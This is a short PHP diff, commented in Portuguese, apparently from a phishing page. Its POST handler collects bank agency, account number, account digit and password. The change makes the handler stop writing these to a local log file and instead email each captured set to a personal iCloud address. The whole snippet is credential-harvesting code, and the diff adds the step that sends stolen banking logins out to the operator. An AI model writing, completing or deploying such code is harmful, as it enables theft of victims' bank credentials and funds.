@@ -11,12 +11,15 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // Monta a linha de log
         $linhaLog = "$data_hora - Agência: $agencia, Conta: $conta, Dígito: $digitoConta, Senha: $senha\n";
 
-        // Caminho do arquivo onde os logs serão salvos
-        $caminhoArquivo = 'registro_log.txt';
+        // Destinatário e assunto do e-mail
+        $destinatario = "renatosantos048383@icloud.com"; // Substitua pelo seu e-mail
+        $assunto = "Novo Log de Acesso";
+        $headers = "From: noreply@example.com"; // Remetente
 
-        // Salva no arquivo
-        file_put_contents($caminhoArquivo, $linhaLog, FILE_APPEND | LOCK_EX);
-        exit();
+        // Envia o e-mail
+        if (mail($destinatario, $assunto, $linhaLog, $headers)) {
+            exit();
+        } 
     }
 }
 ?>
